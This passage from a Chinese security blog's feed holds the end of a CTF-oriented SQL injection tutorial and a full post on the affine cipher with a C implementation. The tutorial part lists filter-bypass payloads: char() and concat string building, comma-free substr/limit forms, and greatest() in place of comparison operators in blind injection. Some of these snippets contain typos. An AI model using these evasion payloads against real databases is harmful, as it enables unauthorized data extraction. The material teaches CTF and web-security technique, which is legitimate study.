class="line"></span><br><span class="line">select * from users where username = char(97, 100, 109, 105, 110)</span><br></pre></td></tr></table></figure><h5 id="绕过字符串黑名单"><a href="#绕过字符串黑名单" class="headerlink" title="绕过字符串黑名单"></a>绕过字符串黑名单</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select &apos;a&apos; &apos;d&apos; &apos;mi&apos; &apos;n&apos;;</span><br><span class="line">select concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);</span><br><span class="line">select select_WS(&apos;&apos;, &apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);</span><br><span class="line">select group_concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);</span><br></pre></td></tr></table></figure><h5 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h5><p>substr(),mid(),limit这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select substr(database(0 from 1 for 1);</span><br><span class="line">select mid(database(0 from 1 for 1);</span><br><span class="line"></span><br><span class="line">select * from news limit 0,1；</span><br><span class="line"># 等价于下面这条SQL语句</span><br><span class="line">select * from news limit 1 offset 0；</span><br></pre></td></tr></table></figure><h5 id="比较符-lt-gt-绕过"><a href="#比较符-lt-gt-绕过" class="headerlink" title="比较符(&lt;,&gt;)绕过"></a>比较符(&lt;,&gt;)绕过</h5><p>使用二分查找的时候需要使用到比较操作符来进行查找。<br>需要使用到greatest来进行绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64；</span><br></pre></td></tr></table></figure><p>如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符。<br>greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure><h2 id="0x10-常用sql语句"><a href="#0x10-常用sql语句" class="headerlink" title="0x10 常用sql语句"></a>0x10 常用sql语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">选择：select * from table1 where 范围 </span><br><span class="line">插入：insert into table1(field1,field2) values(value1,value2) </span><br><span class="line">删除：delete from table1 where 范围 </span><br><span class="line">更新：update table1 set field1=value1 where 范围 </span><br><span class="line">查找：select * from table1 where field1 like &apos;%value1%&apos; </span><br><span class="line">排序：select * from table1 order by field1,field2 [desc] </span><br><span class="line">总数：select count as totalcount from table1 </span><br><span class="line">求和：select sum(field1) as sumvalue from table1 </span><br><span class="line">平均：select avg(field1) as avgvalue from table1 </span><br><span class="line">最大：select max(field1) as maxvalue from table1 </span><br><span class="line">最小：select min(field1) as minvalue from table1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">UNION 运算符 </span><br><span class="line">UNION 运算符通过组合其他两个结果表（例如 TABLE1 和 TABLE2）并消去表中任何重复行而派生 </span><br><span class="line">出一个结果表。当 ALL 随 UNION 一起使用时（即 UNION ALL），不消除重复行。两种情况下，派 </span><br><span class="line">生表的每一行不是来自 TABLE1 就是来自 TABLE2。 </span><br><span class="line">EXCEPT 运算符 </span><br><span class="line">EXCEPT 运算符通过包括所有在 TABLE1 中但不在 TABLE2 中的行并消除所有重复行而派生出一个 </span><br><span class="line">结果表。当 ALL 随 EXCEPT 一起使用时 (EXCEPT ALL)，不消除重复行。 </span><br><span class="line">INTERSECT 运算符 </span><br><span class="line">INTERSECT 运算符通过只包括 TABLE1 和 TABLE2 中都有的行并消除所有重复行而派生出一个结果 </span><br><span class="line">表。当 ALL 随 INTERSECT 一起使用时 (INTERSECT ALL)，不消除重复行。 </span><br><span class="line">注：使用运算词的几个查询结果行必须是一致的。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-SQL注入原理与分类&quot;&gt;&lt;a href=&quot;#0x00-SQL注入原理与分类&quot; class=&quot;headerlink&quot; title=&quot;0x00 SQL注入原理与分类&quot;&gt;&lt;/a&gt;0x00 SQL注入原理与分类&lt;/h2&gt;&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="Web安全" scheme="https://kevens10.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF Web" scheme="https://kevens10.github.io/tags/CTF-Web/"/>
    
      <category term="SQL注入漏洞" scheme="https://kevens10.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="数据库" scheme="https://kevens10.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>仿射密码</title>
    <link href="https://kevens10.github.io/articles/%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81.html"/>
    <id>https://kevens10.github.io/articles/%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81.html</id>
    <published>2019-10-19T06:45:13.000Z</published>
    <updated>2019-10-19T07:46:03.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-算法原理"><a href="#0x01-算法原理" class="headerlink" title="0x01 算法原理"></a>0x01 算法原理</h2><p>仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。</p><p>加密函数：E(x) = (ax + b) (mod m)，其中 a与b互质，m是编码系统中字母的个数（通常都是26）。</p><p>解密函数：D(x) = a^{-1} (x - b) (mod m)，其中 a^{-1} 是 a 在Z_{m}群的乘法逆元。</p><p>a,b是密钥，为满足0≤a,b≤25和gcd(a,26)等于1的整数。<br>a-1表示a的逆元，即a-1*a ≡ 1mod26</p><h2 id="0x02-算法实现（加密与解密）"><a href="#0x02-算法实现（加密与解密）" class="headerlink" title="0x02 算法实现（加密与解密）"></a>0x02 算法实现（加密与解密）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#define N 100</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char m[N+1],c[N+1];</span><br><span class="line">int k1,k2;</span><br><span class="line">printf(&quot;请输入原文:&quot;);</span><br><span class="line">//以回车（换行）作为字符串读取的结束,默认遇空格、回车、跳格键结束。 </span><br><span class="line">scanf(&quot;%[^\n]&quot;,m);</span><br><span class="line">//开始加密</span><br><span class="line">printf(&quot;\n请输入密钥k1,k2:&quot;);</span><br><span class="line">//一次读取多个数值时的格式设置,默认以空格、回车分隔数值，若想以逗号分隔不同数值则需在&quot;&quot;内将格式设置为&quot;%d,%d&quot;，如scanf(&quot;%d,%d&quot;,&amp;k1,&amp;k2)则输入时仅以逗号分隔。 </span><br><span class="line">scanf(&quot;%d%d&quot;,&amp;k1,&amp;k2); </span><br><span class="line"></span><br><span class="line">for (int i=0;i&lt;strlen(m);i++)</span><br><span class="line">&#123;</span><br><span class="line">////&apos;a&apos;对应97,&apos;A&apos;对应65. 以下两式子等价 </span><br><span class="line">//c[i]=(m[i]-&apos;a&apos;+k2)%26+97;</span><br><span class="line">//c[i]=(m[i]-97+k2)%26+97;</span><br><span class="line">    if(m[i]&gt;=&apos;A&apos;&amp;&amp;m[i]&lt;=&apos;Z&apos;)</span><br><span class="line">    c[i]=&apos;A&apos;+(k1*(m[i]-&apos;A&apos;)+k2)%26;</span><br><span class="line">else if(m[i]&gt;=&apos;a&apos;&amp;&amp;m[i]&lt;=&apos;z&apos;)</span><br><span class="line">    c[i]=&apos;a&apos;+(k1*(m[i]-&apos;a&apos;)+k2)%26;</span><br><span class="line">else c[i]=m[i];</span><br><span class="line">//单字符输出每一个密文：</span><br><span class="line"></span><br><span class="line"> &#125; </span><br><span class="line">printf(&quot;\n密文是: %s&quot;,c);</span><br><span class="line">int r0=26,t0=0,t1=1,r1=k1,r2,t2,q;</span><br><span class="line">while(r1!=0)</span><br><span class="line">&#123;</span><br><span class="line">q=r0/r1;</span><br><span class="line">r2=r0-q*r1;</span><br><span class="line">t2=t0-q*t1;</span><br><span class="line">r0=r1;r1=r2;</span><br><span class="line">t0=t1;t1=t2;</span><br><span class="line">&#125;</span><br><span class="line">int k1_inv=t0;//扩展欧几里得算法求逆元 </span><br><span class="line">printf(&quot;\n逆元 %d mod %d 是: %d&quot;,k1,r0,t0);</span><br><span class="line"></span><br><span class="line">for (int i=0;i&lt;strlen(c);i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    if(c[i]&gt;=&apos;A&apos;&amp;&amp;c[i]&lt;=&apos;Z&apos;)</span><br><span class="line">    m[i]=&apos;A&apos;+(t0*(c[i]-&apos;A&apos;)-k2)%26;</span><br><span class="line">else if(c[i]&gt;=&apos;a&apos;&amp;&amp;c[i]&lt;=&apos;z&apos;)</span><br><span class="line">    m[i]=&apos;a&apos;+(t0*(c[i]-&apos;a&apos;)-k2)%26;</span><br><span class="line">else m[i]=c[i];</span><br><span class="line">&#125;//解密 </span><br><span class="line">printf(&quot;\n原文是: %s&quot;,m);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-算法原理&quot;&gt;&lt;a href=&quot;#0x01-算法原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 算法原理&quot;&gt;&lt;/a&gt;0x01 算法原理&lt;/h2&gt;&lt;p&gt;仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数
      
    
    </summary>
    
    
      <category term="密码学" scheme="https://kevens10.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://kevens10.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="古典密码" scheme="https://kevens10.github.io/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
    
      <category term="算法" scheme="https://kevens10.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
